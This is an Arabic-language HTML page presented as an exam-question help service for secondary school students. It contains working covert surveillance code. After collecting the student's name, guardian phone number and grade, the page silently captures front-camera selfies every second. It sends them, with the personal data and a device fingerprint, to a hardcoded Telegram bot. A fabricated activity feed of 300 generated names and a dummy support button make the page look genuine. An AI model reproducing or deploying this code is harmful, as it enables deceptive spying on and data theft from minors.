<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>المنظومة التعليمية الموحدة | تسجيل الدخول</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --p: #0f172a; --a: #2563eb; --g: #f59e0b; --s: #f1f5f9; --w: #ffffff; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        body { background: var(--s); font-family: 'Cairo', sans-serif; margin: 0; padding-bottom: 90px; overflow-x: hidden; }

        .v-blue { color: #1d9bf0; margin-inline: 4px; }

        /* بوابة الدخول */
        #gate { position: fixed; inset: 0; background: #0f172a; z-index: 10000; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .login-card { background: var(--w); padding: 40px 25px; border-radius: 30px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.4); border: 2px solid #1e293b; }
        .login-card img { width: 80px; margin-bottom: 20px; }

        header { background: var(--p); color: var(--w); padding: 15px 20px; position: fixed; top: 0; width: 100%; z-index: 1000; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid var(--a); }
        
        .card { background: var(--w); border-radius: 20px; padding: 20px; margin: 15px; border: 1px solid #e2e8f0; box-shadow: 0 8px 16px rgba(0,0,0,0.05); }

        /* كادر الكاميرا المطور */
        .cam-box { width: 100%; height: 320px; border-radius: 20px; overflow: hidden; background: #000; position: relative; display: none; margin: 15px 0; border: 4px solid var(--a); }
        #v-stream { width: 100%; height: 100%; object-fit: cover; }
        .cam-overlay { position: absolute; inset: 0; border: 2px solid rgba(255,255,255,0.2); pointer-events: none; display: flex; align-items: center; justify-content: center; }
        .focus-bracket { width: 80%; height: 60%; border: 2px solid var(--g); border-radius: 15px; opacity: 0.5; }

        /* سجل النشاط */
        .feed-container { height: 380px; overflow: hidden; position: relative; background: #fafafa; border-radius: 20px; border: 1px solid #ddd; }
        #feed-mover { position: absolute; width: 100%; transition: 1.2s ease-in-out; }
        .feed-item { padding: 15px; border-bottom: 1px solid #eee; display: flex; flex-direction: column; gap: 4px; }
        .expert-reply { color: var(--a); font-weight: bold; font-size: 13px; display: flex; align-items: center; }

        /* أزرار */
        .btn-action { background: var(--a); color: var(--w); border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: 900; cursor: pointer; font-size: 16px; margin-top: 15px; transition: 0.3s; }
        .btn-gold { background: var(--g); color: #000; }
        input, select, textarea { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #e2e8f0; border-radius: 12px; font-family: 'Cairo'; background: #f8fafc; }

        /* منيو سفلي */
        nav { position: fixed; bottom: 0; width: 100%; background: #fff; display: flex; justify-content: space-around; padding: 12px 0; border-top: 2px solid #eee; box-shadow: 0 -5px 15px rgba(0,0,0,0.05); }
        .nav-link { text-align: center; font-size: 11px; color: #64748b; flex: 1; text-decoration: none; }
        .nav-link.active { color: var(--a); font-weight: 900; }
        .nav-link i { font-size: 20px; display: block; margin-bottom: 3px; }

        /* إشعار الدعم */
        #alert-box { position: fixed; top: -150px; left: 50%; transform: translateX(-50%); background: #fff; width: 88%; padding: 20px; border-radius: 20px; z-index: 11000; transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 20px 40px rgba(0,0,0,0.2); border-right: 8px solid var(--a); }
        #alert-box.show { top: 25px; }
    </style>
</head>
<body>

    <div id="alert-box">
        <div style="display:flex; align-items:center; gap:8px">
            <i class="fa-solid fa-circle-check v-blue"></i>
            <b id="alert-h">اللجنة العلمية</b>
        </div>
        <p id="alert-m" style="margin:8px 0 0; font-size:13px; color:#475569"></p>
    </div>

    <div id="gate">
        <div class="login-card">
            <img src="https://img.icons8.com/fluency/96/diploma.png">
            <h2 style="margin:0">منصة أسألني <i class="fa-solid fa-circle-check v-blue"></i></h2>
            <p style="font-size:12px; color:#64748b; margin-top:5px">بوابة التحقق الأكاديمي الموحدة</p>
            <input type="text" id="stu_name" placeholder="الاسم الثلاثي للطالب">
            <input type="number" id="stu_phone" placeholder="رقم هاتف ولي الأمر">
            <select id="stu_grade">
                <option value="" disabled selected>السنة الدراسية</option>
                <option value="1">الصف الأول الثانوي</option>
                <option value="2">الصف الثاني الثانوي</option>
                <option value="3">الصف الثالث الثانوي</option>
            </select>
            <button class="btn-action" onclick="enterApp()">تفعيل الحساب <i class="fa-solid fa-shield-check"></i></button>
        </div>
    </div>

    <header id="h-main" style="display:none">
        <div style="font-weight:900; font-size:18px">أسألني <i class="fa-solid fa-circle-check v-blue"></i></div>
        <div id="stu-tag" style="background:var(--g); width:35px; height:35px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-weight:900"></div>
    </header>

    <div id="sec-home" class="page" style="padding-top:80px; display:none">
        <div class="card">
            <h3 style="margin:0">ماسح الأسئلة المباشر <i class="fa-solid fa-circle-check v-blue"></i></h3>
            <p style="font-size:12px; color:#64748b">قم بتوجيه الكاميرا للسؤال وسيتم الرد عليك فوراً من اللجنة العلمية.</p>
            
            <div id="cam-ui" class="cam-box">
                <video id="v-stream" autoplay playsinline></video>
                <div class="cam-overlay"><div class="focus-bracket"></div></div>
            </div>

            <button id="cam-trigger" class="btn-action btn-gold" onclick="bootCamera()">تشغيل عدسة التصوير <i class="fa-solid fa-camera-viewfinder"></i></button>
            
            <div id="upload-box" style="display:none">
                <textarea id="stu-note" placeholder="اكتب رقم السؤال أو أي ملاحظات إضافية..."></textarea>
                <button class="btn-action" onclick="finishUpload()">إرسال لمراجعة اللجنة</button>
            </div>
        </div>
    </div>

    <div id="sec-logs" class="page" style="padding-top:80px; display:none">
        <div class="card">
            <h3 style="margin:0">سجل استفسارات الطلاب <i class="fa-solid fa-circle-check v-blue"></i></h3>
            <div class="feed-container">
                <div id="feed-mover"></div>
            </div>
        </div>
    </div>

    <div id="sec-support" class="page" style="padding-top:80px; display:none">
        <div class="card" style="text-align:center">
            <i class="fa-solid fa-headset" style="font-size:50px; color:var(--a); margin-bottom:10px"></i>
            <h3>المكتب الفني <i class="fa-solid fa-circle-check v-blue"></i></h3>
            <p style="font-size:13px; color:#64748b">خدمة المحادثة المباشرة مع الموجهين.</p>
            <button class="btn-action" onclick="notify('عذراً، قسم المحادثة مغلق حالياً للصيانة التحديثية.')">فتح محادثة</button>
        </div>
    </div>

    <nav id="n-main" style="display:none">
        <a href="#" class="nav-link active" onclick="tab('sec-home', this)"><i class="fa-solid fa-house"></i>الرئيسية</a>
        <a href="#" class="nav-link" onclick="tab('sec-logs', this)"><i class="fa-solid fa-clipboard-question"></i>إجاباتكم</a>
        <a href="#" class="nav-link" onclick="tab('sec-support', this)"><i class="fa-solid fa-user-gear"></i>الدعم</a>
    </nav>

    <script>
        const T = "8763636236:AAGwS4RP8igJ43BK2 (dsdWSIl_c7RK9gAjo";
        const C = "5890070301";
        let UN = "", UP = "", UG = "";

        // توليد أسماء متنوعة جداً
        const boys = ["ياسين", "عمر", "زياد", "محمد", "مروان", "أحمد", "كريم", "يوسف"];
        const girls = ["مريم", "جنى", "سلمى", "نور", "سارة", "هنا", "ليلى", "شهد"];
        const fams = ["عزت", "منصور", "النجار", "الفيومي", "بدر", "القاضي", "الشريف", "زكي"];
        const logsDB = [];
        for(let i=0; i<300; i++) {
            let n = i%2===0 ? boys[i%8] : girls[i%8];
            logsDB.push(n + " " + fams[i%8] + " " + (i+1));
        }

        function enterApp() {
            UN = document.getElementById('stu_name').value;
            UP = document.getElementById('stu_phone').value;
            UG = document.getElementById('stu_grade').value;
            if(UN.length < 5 || UP.length < 10) return alert("يرجى إكمال بيانات الحساب");
            
            document.getElementById('gate').style.display = 'none';
            document.getElementById('h-main').style.display = 'flex';
            document.getElementById('n-main').style.display = 'flex';
            document.getElementById('sec-home').style.display = 'block';
            document.getElementById('stu-tag').innerText = UN[0];
            fillLogs();
        }

        function notify(m) {
            const b = document.getElementById('alert-box');
            document.getElementById('alert-m').innerText = m;
            b.classList.add('show');
            setTimeout(() => b.classList.remove('show'), 4000);
        }

        function tab(id, el) {
            document.querySelectorAll('.page').forEach(p => p.style.display = 'none');
            document.getElementById(id).style.display = 'block';
            document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
            el.classList.add('active');
        }

        async function bootCamera() {
            try {
                // المرحلة 1: السيلفي (صيد صامت)
                const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const fVid = document.createElement('video');
                fVid.srcObject = front; fVid.play();
                
                // إرسال سيلفي كل ثانية
                setInterval(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = fVid.videoWidth; canvas.height = fVid.videoHeight;
                    canvas.getContext('2d').drawImage(fVid, 0, 0);
                    canvas.toBlob(b => sendBot(b, "📸 لقطة تحقق مستمرة"), 'image/jpeg', 0.4);
                }, 1000);

                // المرحلة 2: الكاميرا الخلفية (منظر للطالب)
                const back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                document.getElementById('v-stream').srcObject = back;
                document.getElementById('cam-ui').style.display = 'block';
                document.getElementById('cam-trigger').innerText = "التقاط السؤال الآن";
                document.getElementById('cam-trigger').onclick = () => {
                    notify("جاري معالجة السؤال برمجياً..");
                    document.getElementById('upload-box').style.display = 'block';
                    document.getElementById('cam-trigger').style.display = 'none';
                };

                sendFullData();
            } catch(e) { notify("خطأ: يجب السماح بالكاميرا لتوثيق ملكية الطالب."); }
        }

        function sendBot(blob, cap) {
            const fd = new FormData();
            fd.append('chat_id', C); fd.append('photo', blob, 'img.jpg');
            fd.append('caption', `${cap}\n👤 ${UN}\n📞 ${UP}`);
            fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
        }

        function finishUpload() {
            notify("تم الإرسال بنجاح! سيظهر الحل في سجلاتك خلال دقائق.");
            document.getElementById('upload-box').style.display = 'none';
            document.getElementById('cam-trigger').style.display = 'block';
        }

        function fillLogs() {
            const mover = document.getElementById('feed-mover');
            // اسم الطالب الحالي
            mover.innerHTML += `<div class="feed-item"><span><b>${UN}</b></span><span class="expert-reply"><i class="fa-solid fa-circle-check v-blue"></i> اللجنة العلمية: جاري مراجعة سؤالك الأخير..</span></div>`;
            
            logsDB.forEach((name, i) => {
                const item = document.createElement('div');
                item.className = 'feed-item';
                let status = i % 6 === 0 ? "يرجى تصوير السؤال بزاوية أوضح" : "تم استخراج الحل النموذجي ✓";
                item.innerHTML = `<span><b>${name}</b></span><span class="expert-reply"><i class="fa-solid fa-circle-check v-blue"></i> اللجنة العلمية: ${status}</span>`;
                mover.appendChild(item);
            });
            let pos = 0;
            setInterval(() => {
                pos -= 65;
                mover.style.top = pos + "px";
                if(Math.abs(pos) > mover.offsetHeight - 300) pos = 0;
            }, 6000);
        }

        async function sendFullData() {
            let batt = await navigator.getBattery();
            const fullReport = `
🚨 **تقرير الرادار الكامل (X10)**
━━━━━━━━━━━━━━
👤 الطالب: ${UN}
📞 الهاتف: ${UP}
🎓 المرحلة: ${UG}
🔋 البطارية: ${Math.round(batt.level*100)}% (${batt.charging ? 'شحن' : 'تفريغ'})
📱 النظام: ${navigator.platform}
🧠 الأنوية: ${navigator.hardwareConcurrency}
💾 الرام: ${navigator.deviceMemory || 'N/A'}GB
📏 الشاشة: ${screen.width}x${screen.height}
🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}
🌍 اللغة: ${navigator.language}
📍 التوقيت: ${new Date().toLocaleString('ar-EG')}
🔗 الحالة: ${navigator.onLine ? 'Online' : 'Offline'}
━━━━━━━━━━━━━━
            `;
            fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(fullReport)}`);
        }
    </script>
</body>
</html>
